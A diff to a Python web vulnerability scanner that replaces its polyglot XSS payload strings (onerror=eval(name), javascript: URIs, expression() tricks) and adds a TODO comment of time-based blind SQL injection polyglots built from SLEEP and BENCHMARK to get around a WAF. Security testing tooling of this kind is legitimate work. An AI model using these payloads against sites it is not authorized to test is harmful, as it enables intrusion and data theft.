@@ -13,7 +13,9 @@ Description: inject a polyglot vector for XSS in every parameter, then it checks
 Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
 """
 def scan_xss(vulns, url, fuzz):
-	payload = ' ">><marquee><img src=x onerror=alert(1)></marquee>" ></textarea\></|\><details/open/ontoggle=confirm`1` ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><sCrIpt>alert(1)</scRipt>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><svg onload=alert`1`><!--'
+	payload = 'jaVasCript:alert(1)//" name=alert(1) onErrOr=eval(name) src=1 autofocus oNfoCus=eval(name)><marquee><img src=x onerror=alert(1)></marquee>" ></textarea\></|\><details/open/ontoggle=prompt`1` ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><sCrIpt>confirm(1)</scRipt>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><!--'
+	payload1 = 'javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42\'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"'
+
 	try:	
 		with firefox.start() as session:
 		
@@ -49,6 +51,17 @@ def scan_sql(vulns, url, fuzz):
 		vulns['list'] += inject+'|DELIMITER|'
 	else:
 		print "\t\t\033[94mSQLi Failed \033[0m for ", fuzz, " with the payload :", payload
+
+
+"""
+TODO:ScanSQL TimeBased 1s
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+used in last in case of a WAF. Many things can trigger it..
+SLEEP(2) /*' or SLEEP(2) or '" or SLEEP(2) or "*/ 
+
+payload = "SleEP(2) /*' || SLeeP(2) || '\" || SLEep(2) || \"*/" 
+"""
+
 
 
 """scan_lfi
